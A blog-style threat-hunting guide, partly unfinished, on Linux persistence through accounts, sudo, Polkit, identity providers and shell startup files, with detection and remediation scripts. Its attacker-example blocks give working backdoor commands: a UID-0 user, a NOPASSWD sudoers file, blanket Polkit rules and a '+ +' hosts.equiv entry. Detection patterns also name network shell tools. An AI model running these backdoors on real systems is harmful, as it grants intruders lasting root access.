---
title: "Linux Persistence Techniques: How Attackers Maintain Access"
description: "A practical guide to identifying and eradicate persistence mechanisms in Unix environment."
date: 2026-11-15T19:00:00
category: Linux
tags:
  - Linux
  - Threat Hunting
  - DigitalForensics
author: "Luca Manfrin"
published: true
archived: false
pinned: true
---

## Introduction

In the ever-evolving cybersecurity landscape, gaining initial access to a Linux system is only one part of a successful intrusion. Maintaining that access over time is often what makes an attack truly effective. This is where **persistence mechanisms** come into play.

Linux environments offer a wide range of features and system components that, while designed to ensure reliability, automation and service availability, can also be abused by attackers to maintain a foothold on a compromised system. From systemd services and cron jobs to SSH configurations, shell initialization scripts and other lesser-known mechanisms, persistence techniques can take many forms and are not always easy to detect.

Understanding how these mechanisms work is essential for cybersecurity professionals. In this post, we will explore all the persistence techniques found in Linux environments, examine how they can be leveraged during post-exploitation activities and discuss the indicators and defensive strategies that can help identify and mitigate unauthorized persistence.

Whether your goal is to strengthen system security, improve threat detection capabilities, or deepen your knowledge of Linux post-exploitation techniques, understanding persistence is a fundamental step toward building a more resilient infrastructure.

## How to Read This Guide
Each technique follows the same structure:

- Type
- Why it matters
- Persistence mechanism
- Detection
- Remediation
- Attacker example

---

## Index

1. [User, group and privilege](#user-group-and-privilege)
    1. [User](#user)
    2. [Group](#group)
    3. [Sudo](#sudo)
    4. [Polkit](#polkit)
    5. [NSS, PAM and Remote Identity Providers](#nss-pam-and-remote-identity-providers)
2. [Shell & Environment persistence](#shell--environment-persistence)
    1. [User scope](#user-scope)
    2. [System scope](#system-scope)
    3. [Alias](#alias)
    4. [Variables and Hooks](#variables-and-hooks)
3. [SSH Persistence](#ssh-persistence)
4. [Scheduled Task Persistence](#scheduled-task-persistence)
    1. [Cron](#cron)
    2. [At](#at)
    3. [System timers](#system-timers)
    4. [Other tools](#other-tools)
5. [Service and Boot persistence](#service-and-boot-persistence)
6. [PAM and Login chain persistence](#pam-and-login-chain-persistence)
7. [Loader, Library & Package Persistence](#loader-library--package-persistence)
    1. [Dynamic linker and LD_PRELOAD persistence](#dynamic-linker-and-ld_preload-persistence)
    2. [Package and library integrity persistence](#package-and-library-integrity-persistence)
8. [Kernel & Boot chain persistence](#kernel--boot-chain-persistence)
    1. [Kernel module (LKM) persistence](#kernel-module-lkm-persistence)
    2. [Boot chain & initramfs persistence](#boot-chain--initramfs-persistence)
9. [SUID, SGID and Binary replacement](#suid-sgid-and-binary-replacement)
    1. [SUID and SGID backdoor binaries](#suid-and-sgid-backdoor-binaries)
    2. [Binary replacement & file capabilities persistence](#binary-replacement--file-capabilities-persistence)
10. [MOTD persistence](#motd-persistence)
11. [Desktop and XDG Autostart persistence](#desktop-and-xdg-autostart-persistence)
12. [OverlayFS and Filesystem persistence](#overlayfs-and-filesystem-persistence)
13. [Web and application persistence](#web-and-application-persistence)
14. [Temporary Path and Fileless execution](#temporary-path-and-fileless-execution)
15. [Container and Orchestration](#container-and-orchestration)
16. [Network level containment](#network-level-containment)

---

# User, group and privilege

## User

### Why it matters

Manipulating local accounts or groups can provide durable persistence and preserve elevated privileges. Unlike many other persistence mechanisms, account- and group-based access may survive cleanup of malicious files, processes, scheduled tasks, or services.

Attackers may create accounts or modify group memberships in advance, then leave the access inactive until it is needed. They may also abuse existing service accounts, add SSH keys, grant `sudo` or `polkit` permissions, or rely on remote identity providers to maintain access without creating a new local account.

During triage:
- Identify all accounts with UID 0, interactive login shells, or home directories in unusual locations.
- Review membership in privileged groups and inspect effective `sudo` and `polkit` policies.
- Correlate suspicious accounts with `authorized_keys`, scheduled tasks, systemd units, processes and network connections.
- Determine whether remote NSS, PAM, or identity providers such as SSSD, LDAP, Winbind, or NIS are involved.
- Review account and group modification timestamps, authentication history and the processes responsible for making changes.
- Check whether disabled, expired, or service-looking accounts can still be used for authentication or privilege escalation.

---

### Persistence mechanism

### User
Review account UIDs, GIDs, login shells, home directories, password status, account aging and file ownership. The presence of an account in `/etc/passwd` does not by itself indicate that the account is usable or locally authenticated.
#### Primary locations

| File | Description |
|---|---|
| `/etc/passwd` | Username, UID, GID, home dir, login shell |
| `/etc/shadow` | Password hashes e expiry policy (root-only) |

#### Detection
```bash
# Elenco account locali con campi strutturati
awk -F: '{printf "%-20s %-5s %-5s %-20s %s\n",$1,$3,$4,$6,$7}' /etc/passwd
# uguale ma output raw: 'getent passwd'

# Account con UID 0 oltre root; possibile backdoor in quanto root-equivalenti
awk -F: '$3 == 0 {print}' /etc/passwd

# Account con shell interattiva e UID utente; possibile abuso di account di servizio
awk -F: '$7 !~ /(nologin|false)$/ {print $1, $3, $6, $7}' /etc/passwd

# Account di sistema (UID<1000) con password impostata; possibile riattivazione di account dormiente
awk -F: '$3 < 1000 && $2 !~ /^[!*]/ && $2 != "" {print $1, $3}' /etc/shadow 2>/dev/null

# Account con campo password vuoto in /etc/shadow; login senza password (backdoor comune)
awk -F: '($2 == "") {print $1}' /etc/shadow 2>/dev/null

# Home e shell risolte senza eval; evita esecuzione di codice controllato dall'utente
while IFS=: read -r user _ uid gid gecos home shell; do
  [ "$uid" -ge 1000 ] || [ "$user" = root ] || continue  # Filtra utenti non rilevanti
  printf '%s uid=%s home=%s shell=%s\n' "$user" "$uid" "$home" "$shell"
done < /etc/passwd

# Eventi di gestione account nei log di autenticazione; ricostruzione timeline
grep -E 'useradd|usermod|userdel|passwd|groupadd|new user|new group' /var/log/auth.log 2>/dev/null || \
grep -E 'useradd|usermod|userdel|passwd|groupadd|new user|new group' /var/log/secure 2>/dev/null
```
#### Remediation
```bash
# Bloccare immediatamente l'account (per conservarlo a fini di verifica e impedire l'accesso)
passwd -l <username>
usermod -L <username>

# Imposta scadenza account immediata; previene login futuri
usermod -e 1 <username>

# Rimuovi da gruppi privilegiati
deluser <username> sudo                  # Debian/Ubuntu
gpasswd -d <username> sudo               # Universal

# Elimina account e home directory (solo dopo averla copiata)
userdel -r <username>

# Cambio password a root
passwd root

# Verifica integrità di /etc/passwd e /etc/shadow dopo ogni modifica
pwck -r
grpck -r

# Verifica che l'account non sia più presente
getent passwd <utente>

# Verifica che non esista authorized_keys residua
find /home -path "*/.ssh/authorized_keys" -exec grep -l "<utente>" {} \; 2>/dev/null

# Verifica assenza di job cron o timer associati
crontab -l -u <utente> 2>/dev/null
systemctl list-timers --all | grep <utente>
```
#### Attacker example
```bash
# Crea root-equivalent user nascosto
useradd -ou 0 -g 0 -m -d /root -s /bin/bash backdoorroot

# Inserisce un account root protetto da password direttamente in /etc/passwd
echo "svc:$(openssl passwd -6 'password'):0:0::/root:/bin/bash" >> /etc/passwd

# Cambia password di un utente silenziosamente
echo 'targetuser:newpassword' | chpasswd

# Riattiva un account di servizio dormiente come backdoor a basso rumore
usermod -s /bin/bash games
echo 'games:password123' | chpasswd
```

---

## Group
Review membership in groups that may provide administrative access or access to sensitive resources, including:
- `sudo`
- `wheel`
- `adm`
- `docker`
- `lxd`
- `libvirt`
- `disk`
- `shadow`
- `systemd-journal`
- Other distribution- or application-specific privileged groups

#### How they works
Group names and privilege implications vary by distribution and application. Validate the effective permissions associated with each group rather than relying solely on its name.

#### Primary locations

| File | Description |
|---|---|
| `/etc/group` | Group definitions e membership |
| `/etc/gshadow` | Group passwords e admin lists |

#### Detection
```bash
# Elenco gruppi locali; verifica membership e gruppi privilegiati
getent group

# Gruppi privilegiati comuni; verifica membership inattese
getent group sudo wheel adm docker lxd libvirt 2>/dev/null

# File di account modificati di recente
find /etc -name "passwd" -o -name "shadow" -o -name "group" -o -name "sudoers" | xargs ls -lah 2>/dev/null
```
#### Remediation
```bash
```
#### Attacker example
```bash
```

---

## Sudo
Look for unexpected users or groups, `NOPASSWD` rules, unrestricted command execution, wildcard rules, environment manipulation and JavaScript-based Polkit rules that grant administrative actions.
#### How they works
#### Primary locations

| File | Description |
|---|---|
| `/etc/sudoers` | sudo rules: users/groups, commands, NOPASSWD flags |
| `/etc/sudoers.d/` | Drop-in sudo rules, ogni file è incluso in autoamtico |

#### Detection
```bash
# Verifica sintassi sudoers; identifica errori e policy sospette
visudo -c 2>/dev/null

# Metadata file sudoers.d; verifica ownership, permission e timestamp
find /etc/sudoers.d -type f -maxdepth 1 -print -exec stat -c '%a %U:%G %y %n' {} \; 2>/dev/null

# Regole sudo ad alto rischio; NOPASSWD, ALL=(ALL), negazioni e alias
grep -RInE 'NOPASSWD|ALL[[:space:]]*=|!/|Cmnd_Alias' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
#### Remediation
```bash
# Rimozione di sudoers drop-in
rm /etc/sudoers.d/<99-backdoor>
visudo -c
```
#### Attacker example
```bash
# Aggiunge utente esistente a gruppo sudo
usermod -aG sudo evil_user

# File `sudoers` predefinito che concede privilegi di root completi senza password
echo "attacker ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/99-backdoor
```

---

## Polkit
Review local Polkit authorization rules for unexpected users, groups, actions, or unconditional grants of administrative privileges. A malicious rule may allow an unprivileged user or group to manage services, mount filesystems, modify networking, access devices, or perform other privileged actions without using `sudo`.

Modern Polkit installations generally use JavaScript `.rules` files, while older or compatibility installations may use legacy `.pkla` files. The supported format and package layout depend on the distribution and Polkit version. Modern rules are commonly stored under `/etc/polkit-1/rules.d/`; legacy `.pkla` files may be read from `/etc/polkit-1/localauthority/` and, on some systems, `/var/lib/polkit-1/localauthority/`.

#### How they works

Polkit provides an authorization framework for privileged system services. Applications request authorization for a specific action and `polkitd` evaluates the request against installed policies.

Modern JavaScript rules commonly use:

```javascript
polkit.addRule(function(action, subject) {
    if (subject.isInGroup("example-admin") &&
        action.id == "org.example privileged-action") {
        return polkit.Result.YES;
    }
});
```

During analysis, pay particular attention to rules that:

- Return `polkit.Result.YES` without sufficiently restrictive conditions.
- Trust arbitrary users, groups, local sessions, or remote identities.
- Grant access to broad action namespaces.
- Permit management of systemd services, mounts, networking, storage, or devices.
- Use unexpected usernames, group names, UUIDs, or subject attributes.
- Contain obfuscated or unnecessarily complex JavaScript.
- Were recently created or modified.
- Are located in `/etc` but do not correspond to a documented administrative change.
- Override another rule because of lexicographic filename ordering.

For legacy `.pkla` files, review `Identity`, `Action`, `ResultActive`, `ResultAny` and `ResultInactive`. Values such as `yes` should be treated as high-risk when associated with broad actions or unexpected identities.

Polkit rules are evaluated according to the installed implementation and rule order. Do not infer the effective authorization solely from a filename or from one rule; inspect all applicable rules and the corresponding action definitions.

#### Primary locations

| Path | Description |
|---|---|
| `/etc/polkit-1/rules.d/` | Locally administered JavaScript Polkit rules, normally using the `.rules` extension. |
| `/usr/share/polkit-1/rules.d/` | Vendor- or package-installed JavaScript rules. Review for unexpected or modified package files. |
| `/etc/polkit-1/localauthority/` | Legacy Local Authority configuration hierarchy. |
| `/etc/polkit-1/localauthority/*/*.pkla` | Legacy authorization entries on systems supporting the `.pkla` format. |
| `/var/lib/polkit-1/localauthority/` | Additional legacy Local Authority data on some distributions. |
| `/etc/polkit-1/localauthority.conf.d/` | Local Authority configuration fragments on implementations that support them. |
| `/usr/share/polkit-1/actions/` | XML action definitions describing available privileged operations. |
| `/etc/polkit-1/actions/` | Local or distribution-specific action definitions, where supported. |
| `/var/log/` and journald | Logs associated with `polkitd`, privileged services, authentication and the actions invoked through Polkit. |

> **Distribution note:** Some current distributions no longer enable legacy `.pkla` support by default. The compatibility backend may need to be installed separately. The absence of `.pkla` support does not make `/etc/polkit-1/rules.d/` irrelevant.

#### Detection

When a suspicious rule is identified, inspect its complete contents and correlate:

- File creation and modification timestamps.
- Ownership and permissions.
- Package ownership.
- The account that modified the file.
- Authentication and `sudo` events near the modification time.
- The user or group referenced by the rule.
- The service or action that the rule authorizes.
- Processes and network connections associated with the resulting privileged activity.

Do not execute or evaluate untrusted JavaScript rules outside an isolated analysis environment.

```bash
# Enumerate Polkit configuration and policy files
for path in \
    /etc/polkit-1 \
    /usr/share/polkit-1 \
    /var/lib/polkit-1
do
    [ -e "$path" ] || continue
    find "$path" -maxdepth 4 -type f -ls 2>/dev/null
done
```

```bash
# Collect metadata for locally managed JavaScript rules
find /etc/polkit-1/rules.d \
    -maxdepth 1 \
    -type f \
    -name '*.rules' \
    -exec stat --printf='%A %U:%G %s %y %n\n' {} \; \
    2>/dev/null
```

```bash
# Review JavaScript rules for broad or unconditional authorization
grep -RInE \
    'polkit\.addRule|polkit\.Result\.(YES|AUTH_ADMIN|AUTH_SELF)|\
subject\.isInGroup|subject\.user|action\.id|return[[:space:]]+polkit\.Result\.YES' \
    /etc/polkit-1/rules.d \
    /usr/share/polkit-1/rules.d \
    2>/dev/null
```

```bash
# Search for potentially broad administrative actions
grep -RInE \
    'org\.freedesktop\.systemd1|\
org\.freedesktop\.udisks2|\
org\.freedesktop\.NetworkManager|\
org\.freedesktop\.login1|\
org\.freedesktop\.hostname1|\
org\.freedesktop\.timedate1|\
org\.freedesktop\.polkit1' \
    /etc/polkit-1/rules.d \
    /usr/share/polkit-1/rules.d \
    2>/dev/null
```

```bash
# Collect legacy .pkla files and their metadata
find /etc/polkit-1/localauthority \
     /var/lib/polkit-1/localauthority \
    -type f \
    -name '*.pkla' \
    -exec stat --printf='%A %U:%G %s %y %n\n' {} \; \
    -exec grep -nHE \
        '^\[|^Identity=|^Action=|^Result(Any|Inactive|Active)=' \
        {} \; \
    2>/dev/null
```

```bash
# Identify suspicious ownership, permissions and recent modifications
find /etc/polkit-1 \
    -type f \
    \( -name '*.rules' -o -name '*.pkla' -o -name '*.conf' \) \
    \( -perm /022 -o ! -user root \) \
    -ls 2>/dev/null
```

```bash
# Review available privileged action definitions
find /usr/share/polkit-1/actions /etc/polkit-1/actions \
    -type f \
    -name '*.policy' \
    -exec grep -nHE \
        '<action |<defaults>|<allow_any>|<allow_inactive>|<allow_active>' \
        {} \; \
    2>/dev/null
```

```bash
# Review Polkit and related service logs
journalctl -u polkit --no-pager --since '7 days ago' 2>/dev/null
journalctl -u polkit-1 --no-pager --since '7 days ago' 2>/dev/null
journalctl _COMM=polkitd --no-pager --since '7 days ago' 2>/dev/null
```

```bash
# Identify the Polkit daemon and its executable
pgrep -a -x polkitd 2>/dev/null
pidof polkitd 2>/dev/null
```

#### Remediation

Preserve the suspicious rule and its metadata before making any change:

```bash
# Create a restricted evidence directory
umask 077

evidence_dir="/var/tmp/polkit-evidence-$(date -u +%Y%m%dT%H%M%SZ)-$$"
mkdir -p -- "$evidence_dir"

# Preserve the suspicious rule
cp --preserve=all -- \
    /etc/polkit-1/rules.d/<suspicious-rule>.rules \
    "$evidence_dir/" 2>/dev/null

# Collect metadata and hash
stat -- \
    /etc/polkit-1/rules.d/<suspicious-rule>.rules \
    > "$evidence_dir/metadata.txt" 2>/dev/null

sha256sum -- \
    /etc/polkit-1/rules.d/<suspicious-rule>.rules \
    > "$evidence_dir/hashes.txt" 2>/dev/null
```

After evidence preservation and incident-response authorization, disable the suspicious rule without deleting the original file:

```bash
# Disable a suspicious JavaScript rule without deleting it
mv -- \
    /etc/polkit-1/rules.d/<suspicious-rule>.rules \
    /etc/polkit-1/rules.d/<suspicious-rule>.rules.disabled
```

For a legacy `.pkla` rule:

```bash
# Preserve and disable a suspicious legacy .pkla rule
cp --preserve=all -- \
    /etc/polkit-1/localauthority/50-local.d/<suspicious-rule>.pkla \
    "$evidence_dir/" 2>/dev/null

mv -- \
    /etc/polkit-1/localauthority/50-local.d/<suspicious-rule>.pkla \
    /etc/polkit-1/localauthority/50-local.d/<suspicious-rule>.pkla.disabled
```

Reload Polkit only if required by the installed implementation:

```bash
# Reload the Polkit service when supported
systemctl reload polkit 2>/dev/null || \
systemctl reload polkit-1 2>/dev/null || true
```

Verify that the rule is no longer active and review recent service events:

```bash
# Verify the disabled rule and review recent Polkit events
find /etc/polkit-1 \
    -type f \
    \( -name '*.rules' -o -name '*.pkla' \) \
    -ls 2>/dev/null

journalctl -u polkit --since '10 minutes ago' --no-pager 2>/dev/null
journalctl -u polkit-1 --since '10 minutes ago' --no-pager 2>/dev/null
```

If the rule references a compromised user or group, do not manually edit account databases. Use the approved account-management process and verify the change through NSS:

```bash
# Verify the affected identity through NSS
getent passwd <suspicious_user> 2>/dev/null
getent group <suspicious_group> 2>/dev/null
```

If remote identity providers are involved, validate and remediate the account or group at the authoritative provider. Review and rotate exposed credentials, tokens, private keys, LDAP bind credentials, Kerberos keytabs, or SSSD secrets as appropriate.

> Do not remove a Polkit rule before preserving the original file, metadata, timestamps, permissions, ownership and hash. Incorrect remediation can break administrative functions or authentication-dependent services.

#### Attacker example
```bash
# Create a malicious Polkit JavaScript rule that grants broad
# authorization to members of a locally controlled group
cat > /etc/polkit-1/rules.d/49-maintenance.rules <<'EOF'
polkit.addRule(function(action, subject) {
    if (subject.isInGroup("maintenance")) {
        return polkit.Result.YES;
    }
});
EOF
```

```bash
# Create a legacy .pkla rule that grants broad authorization
# to members of the same group
mkdir -p /etc/polkit-1/localauthority/50-local.d

cat > /etc/polkit-1/localauthority/50-local.d/49-maintenance.pkla <<'EOF'
[Maintenance authorization]
Identity=unix-group:maintenance
Action=*
ResultAny=yes
ResultInactive=yes
ResultActive=yes
EOF
```

```bash
# Add an existing user to the group used by the malicious rule
usermod -aG maintenance <target_user>
```

---

## NSS, PAM and Remote Identity Providers

Remote identity providers can provide persistence without creating a new local account. An attacker may abuse an existing directory account, alter identity-provider configuration, or add a user to a remotely managed privileged group.

Review:
- `/etc/nsswitch.conf`
- `/etc/pam.conf`
- `/etc/pam.d/`
- `/etc/sssd/`
- LDAP and client configuration
- `/etc/samba/`
- Winbind configuration
- NIS configuration
- Kerberos configuration
- Identity-management agents and caches

```bash
# NSS data sources and lookup order
cat /etc/nsswitch.conf 2>/dev/null
```

```bash
# PAM service configuration
find /etc/pam.d -maxdepth 1 -type f -ls 2>/dev/null
grep -RInE \
    'pam_sss|pam_ldap|pam_winbind|pam_krb5|pam_unix|pam_exec|pam_python' \
    /etc/pam.conf /etc/pam.d \
    2>/dev/null
```

```bash
# SSSD configuration and metadata
find /etc/sssd \
    -maxdepth 3 \
    -type f \
    -exec stat --printf='%A %U:%G %s %y %n\n' {} \; \
    2>/dev/null
```

```bash
# Detect common remote identity services
systemctl list-unit-files --type=service --no-pager 2>/dev/null |
    grep -Ei 'sssd|winbind|nslcd|ypbind|ldap|oddjob|realmd'
```

```bash
# Query users and groups through the configured NSS stack
getent passwd
getent group
```

```bash
# Query selected privileged groups through NSS
for group in sudo wheel adm docker lxd libvirt disk shadow; do
    printf '=== %s ===\n' "$group"
    getent group "$group" 2>/dev/null
done
```

```bash
# Review common remote identity and authentication configuration
for path in \
    /etc/sssd \
    /etc/ldap.conf \
    /etc/ldap \
    /etc/samba \
    /etc/krb5.conf \
    /etc/yp.conf
do
    [ -e "$path" ] || continue
    find "$path" -maxdepth 3 -type f -ls 2>/dev/null
done
```

Treat SSSD configuration, LDAP bind credentials, Kerberos keytabs, cached credentials, private keys and identity-provider tokens as highly sensitive. Do not print their contents into a general-purpose triage log unless explicitly required and securely handled.

#### File Capabilities

File capabilities can grant privileged operations without using SUID. Review them alongside SUID/SGID binaries and package integrity.

```bash
# Enumerate file capabilities, if getcap is installed
if command -v getcap >/dev/null 2>&1; then
    getcap -r / 2>/dev/null
else
    printf '%s\n' '[!] getcap is not available'
fi
```

```bash
# Inspect capabilities of selected privileged directories
if command -v getcap >/dev/null 2>&1; then
    for path in /bin /sbin /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin /opt; do
        [ -d "$path" ] || continue
        getcap -r "$path" 2>/dev/null
    done
fi
```

Investigate unexpected capabilities such as:

```text
cap_setuid
cap_setgid
cap_dac_override
cap_dac_read_search
cap_sys_admin
cap_net_raw
cap_net_bind_service
cap_sys_ptrace
```

The presence of a capability is not automatically malicious. Validate the owning package, intended application behavior, file timestamps, permissions and whether the capability is required operationally. `getcap` is specifically intended to examine file capabilities.

#### Legacy Trust-Based Access

Legacy `.rhosts` and `/etc/hosts.equiv` configurations can allow host- or user-based access without normal password authentication. They are uncommon in modern environments but should be checked when present.

```bash
# Locate user-level rhosts files
for home in /root /home/*; do
    [ -d "$home" ] || continue
    find "$home" \
        -maxdepth 2 \
        -type f \
        \( -name '.rhosts' -o -name '.shosts' \) \
        -exec stat --printf='%A %U:%G %s %y %n\n' {} \; \
        2>/dev/null
done
```

```bash
# Inspect system-wide trusted-host files
for path in /etc/hosts.equiv /etc/shosts.equiv; do
    [ -e "$path" ] || continue
    stat "$path" 2>/dev/null
    sed -n '1,160p' "$path"
done
```

```bash
# Check for legacy remote-shell services
systemctl list-unit-files --no-pager 2>/dev/null |
    grep -Ei 'rsh|rlogin|rexec|shell'
```

Treat wildcard entries, plus signs, unexpected hostnames and recently modified trust files as high-priority findings.

#### Remediation

Preserve suspicious policies before changing them:

```bash
# Create a restricted evidence directory
umask 077
evidence_dir="/var/tmp/polkit-evidence-$(date -u +%Y%m%dT%H%M%SZ)-$$"
mkdir -p -- "$evidence_dir"
```

```bash
# Preserve Polkit rules and metadata before remediation
cp --preserve=all -- \
    /etc/polkit-1/rules.d/<suspicious-rule>.rules \
    "$evidence_dir/" 2>/dev/null

stat -- \
    /etc/polkit-1/rules.d/<suspicious-rule>.rules \
    > "$evidence_dir/metadata.txt" 2>/dev/null

sha256sum -- \
    /etc/polkit-1/rules.d/<suspicious-rule>.rules \
    > "$evidence_dir/hashes.txt" 2>/dev/null
```

After authorization and evidence preservation:

```bash
# Disable a suspicious rule without deleting the original evidence
mv -- \
    /etc/polkit-1/rules.d/<suspicious-rule>.rules \
    /etc/polkit-1/rules.d/<suspicious-rule>.rules.disabled
```

```bash
# Revalidate the remaining configuration where supported
systemctl reload polkit 2>/dev/null || true
systemctl reload polkit-1 2>/dev/null || true
journalctl -u polkit --no-pager --since '5 minutes ago' 2>/dev/null
journalctl -u polkit-1 --no-pager --since '5 minutes ago' 2>/dev/null
```

Do not manually edit SSSD configuration, PAM files, or Polkit policy files without an approved remediation procedure. Incorrect changes can lock out administrators, break authentication, or leave the system in an inconsistent authorization state.

For a suspicious remote identity or privileged group membership:

1. Preserve local configuration and relevant logs.
2. Verify the account and group state at the authoritative identity provider.
3. Disable or remove the unauthorized identity or membership through the approved identity-management workflow.
4. Rotate exposed credentials, keys, bind passwords, tokens and keytabs.
5. Review other systems that may have trusted the same identity.
6. Recheck local NSS, PAM, SSSD, LDAP, Winbind and Kerberos configuration.

#### Attacker Example

The first two examples are suspicious because they grant authorization based on a broad group condition or a broad legacy policy. The last example is particularly dangerous because it can enable trust-based access from arbitrary hosts, depending on the active remote-shell services and their configuration.

```javascript
// Example only: grants a local group broad authorization
polkit.addRule(function(action, subject) {
    if (subject.isInGroup("example-admin")) {
        return polkit.Result.YES;
    }
});
```

```ini
# Example only: legacy .pkla rule granting broad authorization
[Example administrative access]
Identity=unix-group:example-admin
Action=org.freedesktop.systemd1.manage-units
ResultAny=yes
ResultInactive=yes
ResultActive=yes
```

```bash
# Example only: legacy trust configuration
echo "+ +" >> /etc/hosts.equiv
```

---

# Shell & Environment Persistence

## Why it matters

Shell startup files are automatically sourced when users start login shells, interactive shells, or, in some cases, non-interactive shells. Because user-level startup files are normally writable by their owners and are executed in the user’s context, they are a common persistence mechanism after an attacker obtains access to an account.

System-wide startup files can affect many users and may provide persistence with broader impact. Environment variables, aliases, functions, traps and shell hooks can also alter command execution, redirect tools to attacker-controlled locations, capture sensitive input, or launch additional processes.

During triage:

- Identify users with modified or recently changed shell startup files.
- Determine which shell each user actually uses and which startup files it reads.
- Correlate suspicious startup entries with processes launched by the affected user.
- Review network connections created during login or shell initialization.
- Compare files against a known-good baseline where available.
- Check whether startup files are owned by unexpected users or writable by unauthorized groups.
- Review both user-level and system-wide environment configuration.
- Determine whether non-interactive shells, cron jobs, SSH sessions, or automation tools source the affected files.

---

## User scope
User startup files execute in the context of the affected account. The exact behavior depends on the shell, invocation mode, distribution and environment.
#### How they works

For an interactive login shell, Bash generally processes:

```text
/etc/profile
~/.bash_profile
```

If `~/.bash_profile` does not exist or is not readable, Bash checks:

```text
~/.bash_login
~/.profile
```

Only the first available file in that sequence is read automatically. A common legitimate pattern is for `~/.bash_profile` to source `~/.bashrc`.

For an interactive non-login shell, Bash reads:

```text
~/.bashrc
```

For a non-interactive shell, Bash reads the file specified by `BASH_ENV`, if that variable is set. This is particularly important because scripts, automation, or cron jobs may invoke Bash non-interactively.

A typical Zsh order is:

```text
/etc/zshenv or /etc/zshenv-equivalent
$ZDOTDIR/.zshenv
/etc/zprofile
$ZDOTDIR/.zprofile
/etc/zshrc
$ZDOTDIR/.zshrc
/etc/zlogin
$ZDOTDIR/.zlogin
```

Only the login- or interactive-specific files are read when their conditions apply. The `ZDOTDIR` variable can redirect user-level Zsh startup files away from the user’s home directory.

```bash
head -n 1 <script>
file <script>
```

#### Primary locations

| File | Trigger or purpose |
|---|---|
| `~/.bash_profile` | First Bash login-shell file used, if present and readable. |
| `~/.bash_login` | Bash login-shell fallback when `~/.bash_profile` is absent. |
| `~/.profile` | Bash login-shell fallback; also commonly used by POSIX shells such as `sh` and `dash`. |
| `~/.bashrc` | Bash interactive non-login shell. Often sourced by `~/.bash_profile`. |
| `~/.bash_logout` | Bash login-shell exit. May be abused for cleanup, log tampering, or logout-triggered execution. |
| `~/.zshenv` | Zsh configuration read during most Zsh invocations, unless startup files are disabled. |
| `~/.zprofile` | Zsh login-shell configuration. |
| `~/.zshrc` | Zsh interactive-shell configuration. |
| `~/.zlogin` | Zsh login-shell configuration read after `.zshrc`. |
| `~/.zlogout` | Zsh login-shell exit configuration. |
| `~/.config/fish/config.fish` | Fish shell configuration. |
| `$ENV` | Startup file used by some POSIX-compatible shells for non-interactive sessions. |
| `$BASH_ENV` | File sourced by Bash for non-interactive shells. |
| `~/.ssh/rc` | SSH client-session startup file for some server-side SSH configurations. |
| `~/.ssh/authorized_keys` | Not a shell startup file, but may contain per-key forced commands that execute at login. |

> `~` must be resolved from the user’s actual home directory. Do not assume all user homes are located under `/home`.

#### Detection
Inspect the current Bash mode without executing startup files:

```bash
bash --noprofile --norc -c '
    printf "login_shell=%s\n" "$([[ $- == *i* ]] && echo interactive || echo non-interactive)"
    printf "flags=%s\n" "$-"
'
```

- Suspicious commands in startup files, especially network utilities, interpreters, decoders, hidden file writes, or process launchers.
- Unexpected `PATH` manipulation that causes binaries from writable or nonstandard locations to take precedence.
- PROMPT_COMMAND`, shell functions, aliases and `trap DEBUG` hooks that trigger command execution or logging each time a prompt appears or a command runs.
- Hidden or recently changed files in user home directories, particularly when owned by service accounts or tied to dormant users.

```bash
# Enumerate interactive users and inspect common startup files
getent passwd |
while IFS=: read -r user _ uid gid gecos home shell; do
    case "$shell" in
        */nologin|*/false|'') continue ;;
    esac

    [ -d "$home" ] || continue

    printf '=== User: %s | Home: %s | Shell: %s ===\n' \
        "$user" "$home" "$shell"

    for file in \
        "$home/.bash_profile" \
        "$home/.bash_login" \
        "$home/.profile" \
        "$home/.bashrc" \
        "$home/.bash_logout" \
        "$home/.zshenv" \
        "$home/.zprofile" \
        "$home/.zshrc" \
        "$home/.zlogin" \
        "$home/.zlogout" \
        "$home/.config/fish/config.fish"
    do
        [ -f "$file" ] || continue
        stat --printf='%A %U:%G %s %y %n\n' "$file" 2>/dev/null
    done
done

# Review startup files for suspicious execution and environment manipulation
getent passwd |
while IFS=: read -r user _ uid gid gecos home shell; do
    case "$shell" in
        */nologin|*/false|'') continue ;;
    esac

    [ -d "$home" ] || continue

    grep -nHIE \
        '(^|[[:space:];])((curl|wget|nc|ncat|socat|python|perl|ruby|php)([[:space:]]|$))|\
/dev/tcp/|/dev/udp/|base64|openssl[[:space:]]+enc|\
LD_PRELOAD|LD_LIBRARY_PATH|BASH_ENV|(^|[[:space:]])ENV=|\
PROMPT_COMMAND|trap[[:space:]].*DEBUG|\
(^|[[:space:]])alias[[:space:]]|export[[:space:]]+PATH|\
nohup|setsid|disown|mkfifo|/tmp/|/var/tmp/|/dev/shm/' \
        "$home/.bash_profile" \
        "$home/.bash_login" \
        "$home/.profile" \
        "$home/.bashrc" \
        "$home/.bash_logout" \
        "$home/.zshenv" \
        "$home/.zprofile" \
        "$home/.zshrc" \
        "$home/.zlogin" \
        "$home/.zlogout" \
        "$home/.config/fish/config.fish" \
        2>/dev/null
done

# Elenca le home dagli account locali senza eseguire espansioni shell
awk -F: '$7 !~ /(nologin|false)$/ {print $1 ":" $6}' /etc/passwd |
while IFS=: read -r user home; do
  for f in .bash_profile .bash_login .profile .bashrc .bash_logout \
         .zshenv .zprofile .zlogin .zshrc \
         .config/fish/config.fish; do
    [ -f "$home/$f" ] && stat -c '%a %U:%G %y %n' "$home/$f" && sed -n '1,240p' "$home/$f"
  done
done

# Presenza e contenuto di zshenv system-wide; superficie massima per zsh (login+interattiva+script)
[ -f /etc/zsh/zshenv ] && stat -c '%a %U:%G %y %n' /etc/zsh/zshenv && cat /etc/zsh/zshenv

# Script di startup system-wide; superficie comune di persistence
cat /etc/profile
ls -lah /etc/profile.d/
find /etc/profile.d -type f -name '*.sh' -exec stat -c '%a %U:%G %y %n' {} \; -exec sed -n '1,240p' {} \; 2>/dev/null

# Check per PATH hijacking
grep -rE "^export PATH|^PATH=" \
  /home/*/.{bashrc,bash_profile,profile} /etc/profile /etc/profile.d/ 2>/dev/null

# Check per PROMPT_COMMAND, trap DEBUG, e alias abuse
grep -rE "PROMPT_COMMAND|trap.*DEBUG|^alias " \
  /home/*/.{bashrc,bash_profile,profile} /etc/profile.d/ 2>/dev/null

# Modifiche recenti a startup files
find /home /root /etc/profile.d -name ".*rc" -o -name ".*profile" -o -name ".*login" \
  -o -name "*.sh" 2>/dev/null | xargs ls -lah 2>/dev/null | sort -k6,7

# Verifica attributi immutabili sui file di startup
